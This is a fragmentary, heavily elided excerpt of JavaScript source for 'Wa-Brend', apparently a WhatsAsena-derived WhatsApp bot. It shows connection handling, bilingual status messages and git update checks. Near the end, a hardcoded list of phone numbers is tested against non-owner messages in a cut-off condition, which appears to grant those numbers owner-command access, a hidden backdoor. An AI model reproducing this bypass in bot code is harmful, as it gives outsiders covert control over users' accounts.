...
// Sql
const WhatsAsenaDB = config.DATABASE.define('Wa-Brend-deploy', {
    info: {
...
var OWN = { ff: '9940705647159,0,9940558804514,0' }
...
async function whatsAsena () {
    ...
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('Wa')}${chalk.blue.bold('-Brend')}
...
${chalk.blue.italic('ℹ️ Connecting to WhatsApp... Please Wait.')}`);
    ...
    conn.on('credentials-updated', async () => {
        ...
        console.log(chalk.bgGreen('Wa-Brend\n\n Made by @aliyefh_sos' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*Wa-Brend Chatbot Olarak Çalışıyor!* \n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*Wa-Brend Kullandığın İçin Teşekkürler *\n    *- Eva*' : '*Wa-Brend Working as a Chatbot! *\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.fulleva off* _command to return to normal mode._\n\n*Thanks For Using Wa-Brend *\n    *- Eva*'
        ...
        if (config.WORKTYPE == 'public') {
            ...
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                ...
                if (config.FULLEVA == 'true') {
                    ...
                    await conn.sendMessage(conn.user.jid, '*Wa-Brend Working as Public! *\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as public. To change it, use* _.setvar WORK_TYPE:private_\n\n*Thanks for using Wa-Brend *', MessageType.text);
                }               
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
            ...
            if (config.LANG == 'TR' || config.LANG == 'AZ') { 
                ...
                if (config.FULLEVA == 'true') {
                    ...
                    await conn.sendMessage(conn.user.jid, '*Wa-Brend Working as Private! *\n\n_Please do not try plugins here. This is your LOG number._\n_You can try commands to any chat :)_\n\n*Your bot working as private. To change it, use* _.setvar WORK_TYPE:public_\n\n*Thanks for using Wa-Brend*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
        ...
        events.commands.map(
            async (command) =>  {
                ...
                if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                    ...
                    if ((OWN.ff == "9940705647159,0,9940558804514,0" && msg.key.fromMe === false && command.fromMe === true &&
